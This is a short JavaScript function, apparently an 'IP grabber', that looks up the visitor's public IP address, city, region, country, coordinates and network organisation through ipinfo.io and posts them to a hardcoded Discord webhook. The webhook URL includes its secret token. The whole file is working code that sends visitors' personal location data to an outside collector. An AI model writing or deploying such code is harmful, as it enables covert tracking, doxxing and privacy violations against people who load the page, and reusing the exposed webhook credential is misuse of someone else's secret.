async function sendIpInfoToDiscord() {
    const webhookUrl = 'https://discord.com/api/webhooks/1258277399607513159/fnIHNM-y3VV9BQLvw2K65wtfNIB79t3wNs7VIrAm5D_4cZcxiPfFHnYhuuA7SVh1roSb';
    
    try {
      const response = await fetch('https://ipinfo.io/json');
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const ipInfo = await response.json();

      const payload = {
        embeds: [{
          title: 'IP Information',
          color: 0x0099ff,
          fields: [
            { name: 'IP', value: ipInfo.ip, inline: true },
            { name: 'City', value: ipInfo.city, inline: true },
            { name: 'Region', value: ipInfo.region, inline: true },
            { name: 'Country', value: ipInfo.country, inline: true },
            { name: 'Location', value: ipInfo.loc, inline: true },
            { name: 'Organization', value: ipInfo.org, inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      alert('IP information sent to Discord!');
    } catch (error) {
      console.error('Error sending IP info to Discord:', error.message);
      alert('Failed to send IP information to Discord.');
    }
  }
